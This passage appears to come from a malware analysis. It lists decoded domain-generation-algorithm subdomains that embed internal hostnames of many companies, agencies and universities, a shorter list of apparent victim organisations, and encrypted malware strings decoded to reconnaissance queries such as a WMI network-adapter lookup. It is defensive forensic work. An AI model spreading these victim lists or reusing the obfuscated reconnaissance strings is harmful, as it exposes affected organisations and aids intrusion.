8rqihp.5rf882n9wip7njf .8uocahopeqgzm2rnal 8uxfcwddzei9c3x6ah.org 8xst3f5ggtk77mo1its.iastate.ed 8z7keft8wbyax831its.iastate.ed 8zc2f7zfmkq7cqg6.ac.il 8zkaamjh2g8sh276uont.com 92aaw8tz7j5k3y-scroot.com 92snusoij5ifsap8its.iastate.ed 92ulw7ghb5pbyzzkcsa.local 957.5dka7meh8ggabl2 -97tflwonwrdnwbaur.national.c 99ok9523ub9jipskspsd.sk.ca 9bdjctsh8byjmiz8ced-concord.co 9blrphmpprpg2dgkmoncton.loc 9dc2ht.5r_9wduzldbyhj 9dj.g3ymg8.5dcalxl 9enlx7a9bpybtztkcsa.local 9es5n5tnjncswutkglu.com 9f8oqjjokc5ef.ml3jb5xe -9gnclt3bslnjo2ah.org 9ifd3wwkn.bzwkkdtc.brflt.corp 9ild39awebctj7j8gloucesterva.ne 9ipkmtwf3lllood8neophotonics.co 9k.5qnt_l5oxf8amr.corp.intel 9kaklo28ushjtykkspsd.sk.ca 9l5kg5xeuzbjopckspsd.sk.ca 9l5kg5xeuzbjopxkspsd.sk.ca 9o.s9a9aq3zbygg2swd 9siriozm9l8huiakah.org 9t9uqmkgtem8o3dkah.org 9thsaknk5t8alnf8its.iastate.ed 9u72fx2yakc53ag8corp.stratusnet a3qn3y97egrluur9phabahamas.org a3tjqpclopuulgq9deltads.ent a9y3zncd9t58dda7corp.stratusnet a9ys8t-5f0huf9.va.us abb28wg53or2lfc9camcity.local ablyzdqtk2czqs99.com ac52ga5exhj79.fdx8n2n7 a.cpk3cw8riekshhec5 ae3c5gjnenf33do9tdc.internal ae3kdbcys89dpqd9wz.hasbro.com afjo.5t-rkoksmjn05n8 ahab3huu9zajm5z9gncu.local ahctbpo3yxki2529spsd.sk.ca ahctbpo3yxki25a9spsd.sk.ca ai8do_t3fj85nf7amr.corp.intel ai9tjnj8nr3em727csnt.princegeor aigtzyo8y2iieok9spsd.sk.ca aioeketwtakxpns7med.ds.osd.mi ajem9sr5z9x7gkw7dmv.state.nv. ajet-ain37mm739airquality.org ak2esjyixkfy_37its.iastate.ed akg_uyml88uw7o9ciena.com a.kp3hcx9qkrlshmeru alcxemz7b9h7mc39ch.local anb7xoz2f2e2wdr9.uk asthcwbhrr7npb-csa.local atddi0j3g382nt7amr.corp.intel atgdt9awtws.i79bi.corp atgdt9awtws.il9bi.corp atpyqrgkzpu9t7y9nvidia.com atqt0cpye2ipo99spsd.sk.ca aucdibaxt52-2n9bi.corp auwtqpceynsi5599spsd.sk.ca auwtqpceynsi55c9spsd.sk.ca aw28pyuh_k.js9i2m3 az3hucsgr_n2939csa.local b28w99p9dww2we5wftfcu.corp b2mzbofstym0bgefidelitycomm.lo b2pn2twx8_tgi2wmixonhill.com b2we5lnyuui2byrekocholding.loca bedg7oe_focma2wlufkintexas.net beeubn93jpm5k7mwnbim.no bekis9datoujh0wbhq.lan .bg7cjj3zkl7jb2ah.org bixc9monc37zllkkbygchristieclinic. bj8ysw_9jnn.kwthoughtspot.int bjsazwasxmoq5smwcow.local bkakzb8ry50pq5ecsnt.princegeor bkkkja2rnscjudawspsd.sk.ca bkz7h7mhf8erfncwgncu.local blahdwcaasno5cgwgncu.local bsqcieeye8dn79ywbop.com.pk btkh5xp5qwg_oneits.iastate.ed btmge3dkhsbshm3wnvidia.com c3jqcrugdrblemlrbop.com.pk c7q-pkumzj78c.h3io c9ac298y7nisqtgrrbe.sk.ca c9babajogo3d9ylrrs.local c9mg7yltouewe5irs.com c9u2smdz3w2iwuagcsnt.princegeor cellm8w9ypn7rjzgits.iastate.ed ceutkhkbnfytqzrrcamcity.local chcow0yfbf2iewggvl.is.l-3com chh8mtfwdu23onngits.iastate.ed chy0zqqc8r9yhegtr.technion.ac cifgq3nkmrkgjgbrhtwanmgmt.local cjar2ztlncsai73gamr.corp.intel cjxftlhinxwxmnurncs.local ckl237d-5si7n5gcsnt.princegeor cl8ldcyjix8sn2ergncu.local cln2rmfn37iixucgcsnt.princegeor cltfs5z8dhpoufigdetmir-group.r clwo927qqi2icajgamr.corp.intel cnhthc822wjk_ygprod.hamilton. cnulcdwgy7z783lgits.iastate.ed cnulcdwgy7z783ngits.iastate.ed cp7azj5o57yl3b.ylchwmt ctajz78wxs7etwlrepl.com cu5kf7imikya3j9gcorp.stratusnet cumb7fynh5tm83ugits.iastate.ed cupns9jhayyrt5jrfa.lcl cux8utdqdhi3in8gits.iastate.ed d28jo8fts.35enoamr.corp.intel d2-dom8rmxo_8lecobank.group d2fr8yfxmgzydoalagloan.ads d2kodfmggocyaehla.us d2xfbdstzudju8olgncu.local d3w_wl55yuyfglowfhf1.hewlett. d9xqxlsogg9hj0oits.iastate.ed dark3mt.2aylkxln2l7et3 dbjz2xujfiq3qcflmgtsvc.local dbp0apeagqnxswlnv.us d_ci977ysz95jeh.yu dedji8djsq332etoamr.corp.intel deotq7wuqh572_oits.iastate.ed dhqgrb239ezeiztlcow.local dj.cg7lo3aydmllnet.vestfor.dk dktcc5xh8a77ps7lcsa.local dl3cuo2g8ff72k8lcsa.local dlyzcwg3h75fzttlaerioncorp.com dn8cn3jwcwf2dlflbok.com dn.bcqk3rt2_qlocal dscdjl7gwaawzfsocs.haystax.loc dsuezs7rmzl3ryblcoxnet.cox.com dt3odfudd-ygo3lint.sap.corp duggsbxe92leoz7lcow.local duwfoqdaleo9oeclah.org dxcyb7a3ohko2wrlspsd.sk.ca dxrtzm5fqta7pfooits.iastate.ed dz5ckayim8ojexdlfa.lcl dzhwxwaclu5z0llcsci-va.com dznknmtrcbta2ppoits.iastate.ed dzuhm_jd3j8oawoville.terrebonn e2baftsygq2zokxfresprod.com e2hq9fzio2pljdpfgnb.local e2j839rqsimrnlrfspsd.sk.ca e3r22bezbsg5nk8sits.iastate.ed e8s.r9jqxibfytidtjdoap e9rct7b5wyc5_sfmixonhill.com e9rg8rgzlc2wjksscentral.pima.g e9ysihmgkop9irefon.ca e9ysihmgkop9iresdufferincounty. eb0zw8mfbi3rdesits.iastate.ed eb0zw8mfbi3rdpsits.iastate.ed ebp99ik-.j2uefroymerlin.com ee3889qwst7r7lbfspsd.sk.ca efgqf7adlzkw3pttfn. eilm2bdddn2ibipfcree.com einwnjnxeyan2rqfbi.corp ek5cimb2wmg5qc5fmixonhill.com ek5ndduar2cfa5gscorpcomp.drs.m ekcqo3htta2f7p7fcsa.local el5ygj83zwqbabafbmrn.com elwrmik_kt_qbscity.kingston. elwsqemyakbusk2scentral.pima.g ene8rbqxsu0wzhfspsd.sk.ca ensz3xh9ihkgt5_corp.ptci.com ep.s9bh0smsluinumfma3 es2fbk5hpcikyssfah.org es7dbc8ufsk388esits.iastate.ed exju5thcq0wl3mfsro.vestfor.dk ext8sbrbshfrxz5fspsd.sk.ca ez52e9e.bc5xsesits.iastate.ed ez8w897hgf3a9oksamr.corp.intel ezfd__fz23sdnsits.iastate.ed ezkf0wgpyskikhfah.org ezthzeculhznt2_yorkton.cofy f2ljc7m2oe3dyyzmits.iastate.ed f929u9jiofu_eyjbop.com.pk fbco97k3c9kyiwojspsd.sk.ca -fdbygzuiz0k32ah.org femwayhjlf7enpgjah.org fhgif3h3iodap5ajbcofsa.com.ar fhhswmz_ir5n2.glu.com fi9s77zzah55ximjglu.com fisoysr9zagtkkjme-idsolutions. fjcfj9wpkbu2plljcow.local fk27bxnx7ykk9n3joslerhc.org fkmsqiwldexr9mljbi.corp fnrtngqy3p7h27jjitps.uk.net fsgolmk8ckiytcajspsd.sk.ca ftjagnporcq3yayj.com ftlpu2pw3oirqepmprod.hamilton. ftqg92za29s3e.jbanccentral.com fu3780p5w3n5t2mfidelitycomm.lo fz2xe8lqrzdn0.calsb.org fzgf9htkrqrt-mjbps101.local g2ck8kfc892wekkzmmhs-fla.org g2tuwwqhq57xyblzcsa.local g7zuipd.rybefrhijxn g9ci9pi3mbkti5ozspsd.sk.ca gbqlasr3jjz523dzcow.local gbqlasr3jjz523tzcow.local gco7jre9yoj3.qfnbxninf geeo5mm5mzss5qezjarvis.lab ghc8nl89ixmkwlyzrepsrv.com ghgbxoys7qzibr39wfhf1.hewlett. gjqifyhpm32tyoczspsd.sk.ca gjqifyhpm32tyoxzspsd.sk.ca glaofybm8srxtdw9its.iastate.ed glyaeftdzoertu39amr.corp.intel gnxrxye7dea27x3zglu.com gtnmenyecpg7eez9netdecisions.lo guz7dozoxmt.ed9woodruff-sawyer gxnech.s7sszul9prod.hamilton. gxxzhj5odw9m38j9its.iastate.ed g.z0nhc7rqc88h7lz2 h9tssc8z8wxkwh5ucsnt.princegeor h9w5p9nm7yhoycuuamr.corp.intel hbajghkah_z.3uweber-kunststof hcqbe9.gje5d3dk59yc hegc7tx0d_9wycaerioncorp.com heh7ggsbui2tm9aufremont.lamrc. hem5y7qgk3cx_ncingo.kg hhcilwxfoj7o8kaucorp.stratusnet hhdhxtpbzqssb38uwfhf1.hewlett. hhmg28awewzxqciucds.capilanou. hjjmar8d7dbpokechelixwater.org hjn3owxsq7u9xascank.com hkaaftyxbu9ku8fuamr.corp.intel hkdsli2-su3tt2cspsd.sk.ca h.n58c5kpbmy2fy3lu9ow3 hoshkb.z8qhz.jxbgktcn hpw2kq.z_rq.twl99ycd hskes9wsq2ruem3cah.org htdxwqp7cwlfrkzuits.iastate.ed hu5gc2hgif2uuqecpaloverde.local huun0kkjngdydycah.org hymak.837s5yuatsjplpcy hzpx53egojm75wqcah.org i3bsobibqbdzaowoon.ca i3gmmtw_y0bwjoaerioncorp.com i9nxlngilbqaedzoah.org i9pnugnzo8ngjsyhits.iastate.ed ibgzppfc9jjbwugocorp.ptci.com ieyw85ekdr.mgaokeyano.local ihbl9lwssiftttjhci.dublin.ca. ihwceluyp7rdrfxogncu.local ihy3b25zjxls2e2ospsd.sk.ca iiqpob7upf9y5wmhamr.corp.intel ijdcslgcb277h9.yorkton.cofy ijgb3jtgxfq3tsbothoughtspot.int ij.jz8c9ffp2yyofa.lcl ijsokwxkg9loullosmes.org iju9lmo8bgotpdyhad.optimizely. ikcrbl.q8wg52xoansc.gob.pe ikedljgj0y3fkrogksm.local iknjsaphqka8-phits.iastate.ed indxs89nmikdornocow.local inpno3pgctmwowcoah.org ishbcn9i2r5lp-ocsa.local ishbcn9i2r5lp_ocsa.local it33dwz7-9juxhhcsnt.princegeor it83.w7jensptgospsd.sk.ca it88jbkzkftfc5locow.local iup3q2wnjnzs5egospsd.sk.ca izbbuuka2_l2fdocsa.local izeyhiypu3fjm7toglu.com izikxmj2wqltfcthprod.hamilton. j3amcs3pdg9bag0its.iastate.ed ja3.n22bnp92jhgqish jb8-55ydodscoaaah.org jbczizi5bgbmgiincds.capilanou. jcubalw-sw2ozif3if.2l jeftir8jrqze22ynamr.corp.intel jesdd2npwdl8u59ncsnt.princegeor jhwjpuke-tkiylamti.local ji5c8li8gne3t9eacow.local jiamtf.fxqhti5aah.org jji8y5omgebjzx9aironform.com jjirsy5sr7crgriacamcity.local jjkw7b9k9d29ag0its.iastate.ed jjx09pd7q2ffuraalm.brand.dk jljwmzs.ono3bhamixonhill.com jnoti35xooxnknzabi.corp jnqw8t3lf9qyu73agncu.local jr7bani.xyzrmilnih.if jsfpbiqjfnqeaqoncorp.stratusnet juqgpf9qaxsj7p9aedg.net jx7tya0r8uepilnamr.corp.intel jxgw3tzuflgym7_gncu.local jxodbwr3ih9a27kaspsd.sk.ca jxy3q7j5e3u8xlmnamr.corp.intel jyozrrcrxndy8juuzeb.i8 jz7p.ryf2cejgcncorp.stratusnet jzommk3edahbdq0its.iastate.ed jzwzozhrbf9m9ixncds.capilanou. k2phpl3awkqrmgw4sdch.local k2whemzekpjmxxb4bi.corp k3f7myw8myqubxp4aerioncorp.com k3kx7shkl82gaa0its.iastate.ed k98z3wrya5drcca4ah.org k9anhyesew3j98y6wfhf1.hewlett. k9bbgncnxd8e23z6ad.optimizely. kaxg2bj97.o239gchgy kbl9mm9csq8z5l74csa.local kbl9mm9csq8z5ll4csa.local kbtzjx8dqlfk2o34publiser.it kbupqluy8nepmt54coxnet.cox.com kdfo.roynuhgn9u7cb3yhy kgp7zktrz.2ukjfu2nz2xd kh7wefum8788rlb4gncu.local khojb553tx9k2p24spsd.sk.ca kikjjx387rz3mwa6csnt.princegeor kj0qh5tghgpkrx6corp.stratusnet kjeqrpfi5dlw.t6woodruff-sawyer kjh3rk7kwj8dznl6its.iastate.ed kjuqgn53hrh39xw4tx.org kkjow5z2ujzipc0its.iastate.ed kkjow5z2ujzipcl6its.iastate.ed kmwz.m9jqpau7jh0sb kq28kjo3.uc8299l2yr kse7x3uut8bk8z84intensive.int kszhgzo5oec.974nj_3357zllc ktfyiqpj8gzp2xj6amr.corp.intel ktrj.wptexkpyh4spsd.sk.ca k.u2o0-lz7xjmctgzoxy ku5jq5wetnbk5px4spsd.sk.ca kugd.gmz2qzeah6its.iastate.ed kxxmnjpiu7txoxt4bop.com.pk l2gbelo2soxc.apcds.capilanou. l2rcxs-fmbzsg3pits.iastate.ed l2rcxs-fmbzsgppits.iastate.ed l3w7ae8fdiwoxm8bgncu.local l5qqlfmliffp9dcly9k.in l93hx_8aqhz8qmbrocket.science l9n82bbknu3tdgbbparametrix.com l9rmazo3a33s2b3bcow.local l9ufymw2p2jscgcbosb.local lbiasip35cnrwo2pcsnt.princegeor lbjmjibujbt87ylbnswhealth.net lbmldpgkkoa9xtfpservitia.intern lboa9ws3h99di7abspsd.sk.ca lbs35zoooztmababdotcomm.org lbxjcsprb3eguckbsc.pima.gov le9mqyigitm3ozpbah.org lea3dino93hh00internal.jtl.c lhi2wcl-iqrnezbglu.com lid5fw77m5tz2j.pqcorp.com ljomjlcpabtsp9ubcow.local ljomjlcpabtsp9zbcow.local ljqq3f28prwscj9bsba.gov llmfof577aob.nbhaifa.edu ln9rdbzapnpk9t0its.iastate.ed lnhm0i9iuf3yl3bah.org lnx0cgnpn5s3bjb.com lsaalcs8hkhdtmabspsd.sk.ca lsc7ke_dtcowmfbgncu.local lska32p85ozr75kpcsnt.princegeor ltk7mbgkky2lrgmpits.iastate.ed ltt7wlrzagzyk99bmixonhill.com ltt7wlrzagzyk9gbmixonhill.com ltthztymc3nqbsrpcorpcomp.drs.m l.udgbx5s3nc_hxzd7 ludj.std3hzxsgbbok.com lxawxm8sxg3ab-pwfhf1.hewlett. lxb_e9nep85iz7pad.optimizely. lzq7dt8ldhqon7ebgncu.local m2-ak2g8jybwjtnyorkton.cofy m2j5fupdmaho3yknpslab.local m3bhjo7hzflqhdtn.il m3fggcdy8sxt9nenbarrie.ca m3_fu97gjepyhgnspsd.sk.ca m3irezi2i9x39annripta.com m3jeudmxwb9wcnbnsc.pima.gov m572k.2mnbprxpafb97 mcowezyo9bnrkbpde9.2pz mdnlh2.8xg8og7oyzxj meb3hnyba2k8ttdvits.iastate.ed meccathlufwtnexnah.org mepwhhh7n258ymsvintra.rakuten. meqdtyp2kmsgxu9nnvidia.com mh59xxknkqyqfyunaerioncorp.com mhk77iwo7cqcoa7ncsa.local mhx8dhdgd8htttzvad001.mtk.lo mhxyco7sem3azyuvprod.hamilton. mn5afpkmtsyk3l9vcorp.stratusnet mnyjn7yrnw.uuizzcg msyfk5fyttyrwhnngncu.local mthfwga3igs8kfwnmixonhill.com mtuykiibx0yq3sncamcity.local mx5gykencc-hrgvsos-ad.state. mxy7rku9d5psywfnfa.lcl mxycf-le7yn27hvint.lukoil-int n22xfe8gwm99mnbqinternal.hws.o n27a9c3ud2ksd8dqits.iastate.ed n27krgh9yglmlajqinternal.hws.o n33rd9bwbj78mlq7spsd.sk.ca n38r07waygaescqcsnt.princegeor n9twxnzmpsnnxro7ah.org nb9p8_9hqlz7tb7.org nblmld.pul5pzz7gncu.local nemf3dkrjwiommdqad.optimizely. nhrxr8mkqbgg8obqcorpcomp.drs.m nj3w7u3lpzln7ag7ah.org nj8maf-whwzzkz7atg.local njncsxpyy2jygo97te.nz nkapbiq3fismndy7ah.org nk_i73msdam7ad7bop.com.pk nknbqcqm9egpxe97rs.local nnn9w7c.mfwsahqcds.capilanou. no7optjah39f9nmkf.gnam nqa.p8fxnn8syya8s5gxry ntdmywgl2ypzqhmqits.iastate.ed nthuoc9b5icnpgi7ieb.go.id ntku28zx2add9bdqc4e-internal.c ntw.3ojuyigupe7csa.local nua5e3uyxeu8plf7uis.kent.edu nuel3ihnor25ewd7ciena.com nuxyjohrs2578y27loud.com nwcaao8.8ihgxoa2spghrm nx_r892jpsoh7nqad.optimizely. nya9d.df8sqg0iiljamaj nzzmfd8kphz5ezp7gncu.local o2pifrz.bflnahpch2news.tv o9cagarcu5z5spyp.au o9eblxqifbroea7pah.org o9qu3nami5gocuopah.org o9ymirsw7q3zgmoccds.capilanou. o9yxa9f9gap8p5npfa.lcl ob385p2y89bpcbypcorp.ncr.com ob9uu_dzmdk5drpbi.corp obkxmhbo5qqu5gmpcsa.local obn9xd2cmqlwj3ecits.iastate.ed oedopp33b52xgktcghsmain1.ggh.g ohmebeozdxj222apspsd.sk.ca oilej7j-rstmnrccsnt.princegeor oipiq7u8kuumzj7pxdxinc.net oiqg9er08towe3pftfcu.corp oirg2bntepwy8q9pgncu.local ojfzc.7iqjcaj7cits.iastate.ed okdxdbfggg885onpfa.lcl oketsdyhbkgp_ycits.iastate.ed o.kpehch9qkqlsimesh olpmorbq7.z9mwccds.capilanou. ord79p7sm7ywx3bj.sutmf orlb2aukqam2p.afx7a ou7pkls_dlmmyupcow.local ouo8tlyfea2dem3camr.corp.intel oz99mri8u52s38qpmixonhill.com p2lp3laqriy5n9kespsd.sk.ca p2lp3laqriy5n9sespsd.sk.ca p2ly2cxidwhcw9nrwardrobe.irobot p32s7ce5e3ftkiqrallegronet.co. p9qzarnksxamdybrcorpcomp.drs.m p9x9yadqwm7o-nrc4e-internal.c pb27yxe3pnh9u8leftfcu.corp pbcsplu7qz5rw3urits.iastate.ed pbpqjswtq9sincneah.org pduxwqnt.e55w2yzu0 pe0f8uw9dayt39rcsnt.princegeor peegqrjanke8i98egncu.local pefmydjtnwo3z87erccf.ru pexlntjfskhsmutrwrbaustralia.ad phwao_nejbx3bjeap.serco.com pil2lhtt8c99urdeies.com pj5iper82x5tkihemolsoncoors.com pjah8m5x2otrwyhrwcnet.whitecase pjj7j73r9jnwcyjecoxnet.cox.com pk9qihpirs3plljenet.vestfor.dk pkqoprn8udpdk8zrprod.hamilton. plh9tafwwcmozldrc4e-internal.c plilobgbb7e-ddeaerioncorp.com plppk3zjh-aj8eepcsco.com plr7wqabqb_8xyeta.org pnf-ebgui23ot9egncu.local pnf-ebgui23otxegncu.local pnsucinao958klierbe.sk.ca pqczkriq8iw-8xajxxyx. psqxiutcpb5du22rville.terrebonn ptuqzcxwxxctmmlecow.local ptuqzcxwxxctmmzecow.local pupj997x8e9ohhwesdch.local pxhxa3egf8ksu0rdigitalsense.co pxieyottcjlgjslrprod.mobily.la pxloai2jsntql0rcorp.stingraydi pxp25pt.ew7elsesc.pima.gov pxqd8zjse8ankfjeuis.kent.edu q9cibldstwp25f5ycsnt.princegeor q9cibldstwp25fsycsnt.princegeor q9hik8is7bathrkispsd.sk.ca qcesurliszjnjk.ls92hzf qepu2qrlgpuxuxyicsa.local qgmc5us.rsbcl-akol qhiuqclj5o2amslifa.lcl qi529tttiilodbeyits.iastate.ed qi5n89xwomnsui0ad.optimizely. qib.csdo3ig5m8iyorkton.cofy qihbery8mr7i3otywfhf1.hewlett. qinx9fkibqupp_iah.org qj2zgbygs22k2a3igncu.local qjbiddh5735tmacispsd.sk.ca qjedb.cdhlh377invidia.com qjjax7tklc8rhzdyamr.corp.intel qjnhn5wnmm32gtbiamalfi.local qjqi-f5tpd2e.ycsnt.princegeor qk3aw7uilmdrcznyamr.corp.intel qk7sadyqbmyc333iuis.kent.edu qkm3k9ru8ktjgeeymilledgeville.l qkpx3wh.9isxrtyci.dublin.ca. qlszf9y9sxskertigncu.local qluidzx8ke8xoncymagnoliaisd.loc qlxia8h27zrtcrgispsd.sk.ca qp37.q75pbguk-rzox7l3 qsg7bzaupoc8muyicosgroves.local qsxlfirr3l75ntdicow.local qtiykxhl2axfi8gyzippertubing.co qtm5bnardlumjjoikcpl.com qua2feudiunok90its.iastate.ed qua2feudiunok9uyits.iastate.ed qxqefq9plase3mcicamcity.local qx.rb-n9dx8uxycorpcomp.drs.m r8cd8i.3mro7h3hse8n7l8 r8dl.cwn8se7ismttba r.8iwohlcsu7k3uxt2m r93ftir9kyk97efssjhsagov.org r99ziat3yw.k5dzwfhf1.hewlett. r9eeidc_2gqshkzmountsinai.hosp rae89kko7jw2m5zfi2. reaf52md75.ulusbop.com.pk reblmoyjbukgmlgsah.org rhct9ljsuqpeofozcsnt.princegeor rhct9ljsuqpeofrzcsnt.princegeor rhhygmb55aq7tj8scow.local ri2afse2md57kq7sfa.lcl rihrz8dh3pu3yr8ssecurview.local rkhztrt8y57tjo8zwfhf1.hewlett. rkomocgotn9t5exscoxnet.cox.com rkr9kgqm7se5x2usah.org rl2h9cdtwdidnsysfa.lcl rl2n3eyi9g2cc3isernational.uz rlhlyut2srowfpnzits.iastate.ed rn99b2b2zifpcenscow.local rnofpimj7w7bhzusbop.com.pk rs3.ao5noklrz7saerioncorp.com rszi3uosqnl9zmysnvidia.com rtuljier8-0crsxnet.kz ru_95wpag2hohwscisco.com ruwtgll2u0eif9zcsnt.princegeor ruwtgll2u0eifhzcsnt.princegeor ruxtr8c2pnriwrxsspsd.sk.ca rx-nkmew3cd8ztzops.lab3.servi rxqd5hxrsaamptf9.9w3di8zljgri25 rzffkb3heu8nju5zcorpcomp.drs.m rzkerw3curbllwosfmtn.ad rzl9botd37qirkiskcpl.com s2gu9cpupjd298wmswitchnet.nv s3ymjljcpt7zkx5tcorpcomp.drs.m s92uthnsr8wql5ytits.iastate.ed sau52qbk.y5rr9f9h- sbjhfuaplq08mjmnbim.no sbopoamqzsb3tzmmglu.com sbps5llzg_ej9mtprod.hamilton. segm5e7dn58xu9_bop.com.pk sewksmhdmj98jkrtnewdirections.k sh0_fqu9sb_xmbgeltd.com shl-mjcjzmtaaqmrbe.sk.ca sij88dteilf3eemtamr.corp.intel sj859bxlw9g5tm_smes.org sjb9l78yxf9yxjjmfa.lcl sjf9yrsh5kdokwrmtaylorfarms.com sjmqaz5sxrc3kbgmtx.org sjy79p5qr2kya5jmfhc.local skcuf88acqalmn9tsfsi.stearnsban skl2qsffide5tb.ebe.co.roanoke skqhkfgmnsnrxe_ah.org sl.3lzygjwq7tfmcoxnet.cox.com sliuyhe2rrcqf5ftits.iastate.ed slsnodnet7djap.wfhf1.hewlett. slzrgresdgcy_amions.com ssqnocsm2l5ndsrmcda.corp stsdlwks2fo.s7mcow.local stsj8aw5eewk7d9mspsd.sk.ca t273bxojxumf5br4its.iastate.ed t2j8j5e_abdm2o4csnt.princegeor t3_j3pcl_e2mdvfa.lcl t8p5_.ts20zit5ekfyoj t92awyus7fzylom4prod.hamilton. t9stcj2eeispmfhvacmedctr.ad tb2bubeutsbyijo4ville.terrebonn tbpwa39o98mulwbvcda.corp tby8fe_np5am9qvkcpl.com tcwjl8ckisiml.dpxjdu5m te7crp3dmk7phupvgncu.local te83jsizj.lcwfvcow.local tedetd55aczujm7vbi.corp tepal3hoa2_acl4corp.stingraydi tesl3yuh8mj7xae4mnh.rg-law.ac tiln7ppyizoe5gs4ccscurriculum.c tjiccfs3ccb5sg9vmixonhill.com tjiccfs3ccb5sgbvmixonhill.com tlbqutiaefaf2d3vcsa.local tlcucnqzg777zodvaerioncorp.com tn8jhpm5jmykfoxvuncity.dk tnp8qxqnkuzr5nbvspsd.sk.ca t.nqic83nno-tyyn8d558 ts5fsi5uycokm25vah.org tsgyboqlmn.abk4corp.stratusnet tth9dpjody9m8cjvfcmat.org txffdaqafygwstdvkcpl.com ty.zcueatzfb3tton-pot tzld8q.-53byl4its.iastate.ed tznnzw93niiqcwivscif.com u2f-3ngjw.omlgfa.lcl u33r8577ry9an2bacsnt.princegeor u3me37fzs5u9qedgfa.lcl ubokgndwzehahffaamr.corp.intel ubokgndwzehahflaamr.corp.intel uh7rhp.n8rdl3mgnswhealth.net uhkzqoxolsu3r-anaf.nou-system uhsmn_podhpdq2gmixonhill.com uih_ecino5gy87gcsa.local ukffeyk22eptiidgmolsoncoors.com ukp7dfo.z2keg8gcow.local ulazewoekcuh7rygzgs.loc uldg5w.yb9prg7gnnge.org unu70ikkugjyfpgah.org usjr35p0oba72iacsnt.princegeor uttdkt2bw_dqsagcamcity.local uw3dojgwzsyjk.dpblgi5z uxm92.w2czwqoiacds.capilanou. w27tg99nugetsn95camcity.local w7uoqssz22sysg.rlqhc- w7wzzoq57_8ax.gj.c- w8a8yspeb9dcw8.u3yi7fy w8lb2_gpeaxx9qi.ehmd9 w92yrosxibawsec5pageaz.gov w99obr2ewfiqf9p5escap.org w9jllgmi2njsps_gncu.local w9jllgmi2njspsz5gncu.local w9.jn5ci3ir2ui5gncu.local w9nxqct9dhpycatfneophotonics.co w9u5azkriclorkffvoice.booking. wbq3y77ydbo3-55intensive.int wbzhx8yn2lr3by85nnge.org wekgpkhq3d3bk-5aerioncorp.com wfa7syxugttu2w.ulwtc. wh29mh3x7wzciwqfsos-ad.state. whnbemmbxppmze3fits.iastate.ed wi_serytu2358_coxnet.cox.com wjbojk7zghriy5tfamr.corp.intel wjlc52bg28hjp8e5corp.ptci.com wjpa2eipqlnym5l5repsrv.com wk9odkpnguait5ffamr.corp.intel wkl2jjiq0yeuks5spsd.sk.ca wl0bxye3lpzgn_ncpa.loc wl27lb5uppzw5gpfservitia.intern wnig5shb3febjfe5aerioncorp.com wtg75tfgwuok7xwfville.terrebonn wtyigyulktb5jqnfits.iastate.ed wudusq2sao9kc5pfad.optimizely. wudusq2sao9kc5tfad.optimizely. wzamq23wa32a9xe5kk.dk wzjzgz2chaligqi5cplds.local wzq8fys9wl7wqifffujitsugeneral. x2onhbjkjximqmj_sh.com x2pjglbnmgnjsxq.amcity.local x35pg5kgxj8q0z.om.au x3reqh5egeku7fl_h.org x9lulf7i5nl2p37.ncu.local x9trqhgwbo8geay.ow.local x9zrjkkat3l9miklits.iastate.ed xbot_9rlfipbyl.uww.net xe3u.znqt8jinl.isco.int xe5lqn3ejo7l3cl_iley.com xeo8oqifaylicbclsignaturebank.l -xgwwjd33ilw3g2ah.org xh5fwld8gtawpsiladmin.callidusc xh92jtl9ufkizqp0wd.local xhexec7bwp7fz2plits.iastate.ed xjnug0a52n22jj.ncu.local xkjsjk2qzsm3ujo0psd.sk.ca xl3jsugt-nn0llcorp.stingraydi xlybwhcxnqwrkxs.sf.cc xnoelj7msa5dm93lad001.mtk.lo xnojifdeowfi8gelprod.hamilton. xs7pkqzcyeyufyo_sd373.org xufls.skokicp3lad.optimizely. xxgzplgyhws9cmn.sa.local xxn37pmwkfn.ep0acr.com y2fe.o3nrmtfxzhcom y2fpzua_it5eh5hspsd.sk.ca y2pebn5jwuym5zi5its.iastate.ed y2r3o3fu2-j5pu5amr.corp.intel y.5f_c98numq2ilnzw y9rwk9l8nsuh8bshscif.com ybhs7uuwgz2r5el5its.iastate.ed yg7wxw3jf.5x5xkbhlk yg9pl8ilnjeh2.dchjcipu yhdul9z5khhrfpnhparentpay.local yknoricx2wpo93chcamcity.local ykq9c5dzcyzornn5c4e-internal.c ykrluha795d_p7haerioncorp.com yn5kaq3jorefhxnhciena.com yn7pqngnau355xchspsd.sk.ca yn7pqngnau355xhhspsd.sk.ca yn7pqngnau355xxhspsd.sk.ca ysbxhltmyb2dtso5ville.terrebonn ysrq9dplu9.xgchcorp.dvd.com yxfogk2kknyqj7y5corp.stingraydi yxmpbnazahj52xshspsd.sk.ca z3lix53kgw.hsdkamr.corp.intel z9ok2mobsuf2oahtdsh.ca.gov zb2gqt3kixw3clykneophotonics.co zbiakqssx9gdh_tspsd.sk.ca zboabkpsoc7r5a5kcsnt.princegeor zc9zoxzyx.k9sygy9grxsr zcpgi7j9j.8x3clc9ji zebuxooezguwh8ut.il zeiz5wdynzgolt2tgksm.local zekn9yhytkxh2oftyorkton.cofy zetqgaxk_e3ergtah.org zh57ihayscalzwtkits.iastate.ed zj5zdu3oytqsxxskcorp.riotinto. zjsc7m3j8z9u7khtah.org zk2mfuorrzpsnhdtcow.local zk2ulb_wy9peibtkeyano.local znclnxnz823wte3tcasino.prv zncm88il2ul3mudtah.org zsh793.8tho5fltgncu.local zsh793.8tho5fntgncu.local zssi7tx_fgx-jtbi.corp zu_edoflmjqhtjtcsa.local zu_edoflmjqhtttcsa.local zu_edoflmjqhtytcsa.local zx3i2wx9suhptcdtnswhealth.net zxhqdxzkd7hlxbgkint.lukoil-int zz2aaqb2xlqdc_tspsd.sk.ca zz2tei7bd7bq0xkad.checkpoint.
`

## Possible victims after decrypting dga with multiple hits for each entry
`
admin.callidusc ad.optimizely. aerioncorp.com ah.org amr.corp.intel bi.corp c4e-internal.c ci.dublin.ca. corp.dvd.com coxnet.cox.com csa.local detmir-group.r e-idsolutions fa.lcl ftfcu.corp gksm.local glu.com gncu.local inf.dc.net intensive.int int.lukoil-int its.iastate.ed neophotonics.co nvidia.com internal.hws.o repsrv.com scentral.pima.g sc.pima.gov sos-ad.state. thoughtspot.int uis.kent.edu .vestfor.dk wfhf1.hewlett. woodruff-sawyer
`

## All encrypted string
```
C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==  ->  Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true
c0ktTi7KLCjJzM8DAA==  ->  Description
83V0dkxJKUotLgYA  ->  MACAddress
